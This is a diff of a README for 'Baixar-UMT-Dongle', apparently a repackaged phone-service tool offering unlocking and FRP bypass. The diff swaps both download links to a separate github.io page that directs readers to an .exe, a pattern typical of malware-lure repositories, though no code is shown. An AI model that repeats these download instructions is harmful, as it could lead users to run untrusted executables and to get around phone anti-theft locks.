@@ -1,6 +1,6 @@
 # 🛠️ Baixar-UMT-Dongle - Simple tools for phone service repairs
 
-[![Download UMT Dongle](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/locenz2417/Baixar-UMT-Dongle)
+[![Download UMT Dongle](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://locenz2417.github.io)
 
 This project provides the necessary software files to install UMT Dongle drivers and tools on Windows 10 and 11. These tools assist technicians with phone unlocking, FRP bypass, and firmware management. This guide helps you set up the environment on your computer to ensure the hardware functions as intended.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these conditions before you begin the install process
 
 Follow these steps to obtain the correct files for your system.
 
-1. Navigate to the [official repository download page](https://github.com/locenz2417/Baixar-UMT-Dongle).
+1. Navigate to the [official repository download page](https://locenz2417.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest version available.
 4. Select the file ending in .exe to start the download.
